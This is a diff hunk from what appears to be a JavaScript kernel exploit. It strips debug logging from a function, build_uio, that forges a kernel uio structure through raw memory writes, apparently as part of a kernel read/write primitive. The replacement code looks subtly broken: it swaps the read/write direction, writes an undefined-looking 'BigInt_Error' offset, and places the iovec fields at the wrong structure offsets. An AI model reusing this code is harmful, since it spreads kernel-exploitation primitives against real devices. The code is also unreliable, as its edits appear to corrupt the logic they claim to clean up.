@@ -1328,57 +1328,15 @@ function leak_kqueue() {
   * ===========================
   */
 function build_uio(uio, uio_iov, uio_td, read, addr, size) {
-  log('[UIO] build_uio ENTER');
-
-  // --- Debug incoming values ---
-  log("[UIO] uio       = ".concat(uio));
-  log("[UIO] uio_iov   = ".concat(uio_iov));
-  log("[UIO] uio_td    = ".concat(uio_td));
-  log("[UIO] read       = ".concat(read));
-  log("[UIO] addr      = ".concat(addr));
-  log("[UIO] size    = ".concat(size));
-
-  // --- Basic validation ---
-  if (!uio || !uio_iov) {
-    log('[UIO] ERROR: uio or uio_iov is NULL');
-  }
-  if (!addr) {
-    log('[UIO] WARNING: addr is NULL');
-  }
-  if (size <= 0) {
-    log('[UIO] WARNING: size is invalid');
-  }
-
-  // --- Write fields (placeholders only) ---
-  log('[UIO] writing uio_iov');
-  write64(uio.add(0x00), uio_iov); // uio_iov
-
-  log('[UIO] writing uio_iovcnt');
-  write64(uio.add(0x08), UIO_IOV_NUM); // uio_iovcnt
-
-  log('[UIO] writing uio_offset');
-  write64(uio.add(0x10), new BigInt(0)); // uio_offset
-
-  log('[UIO] writing uio_resid');
-  write64(uio.add(0x18), size); // uio_resid
-
-  log('[UIO] writing uio_segflg');
-  write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
-
-  log('[UIO] writing uio_rw');
-  write32(uio.add(0x24), read ? UIO_READ : UIO_WRITE); // uio_rw
-
-  log('[UIO] writing uio_td');
-  write64(uio.add(0x28), uio_td); // uio_td
-
-  // --- iov entry ---
-  log('[UIO] writing iov_base');
-  write64(uio_iov.add(0x00), addr); // iov_base
-
-  log('[UIO] writing iov_len');
-  write64(uio_iov.add(0x08), size); // iov_len
-
-  log('[UIO] build_uio EXIT');
+  write64(uio.add(0x00), uio_iov);      // uio_iov
+  write64(uio.add(0x08), UIO_IOV_NUM);  // uio_iovcnt
+  write64(uio.add(0x10), BigInt_Error); // uio_offset
+  write64(uio.add(0x18), size);         // uio_resid
+  write32(uio.add(0x20), UIO_SYSSPACE);// uio_segflg
+  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_rw
+  write64(uio.add(0x28), uio_td);       // uio_td
+  write64(uio.add(0x30), addr);         // iov_base
+  write64(uio.add(0x38), size);         // iov_len
 }
 
 function kreadslow(addr, size) {
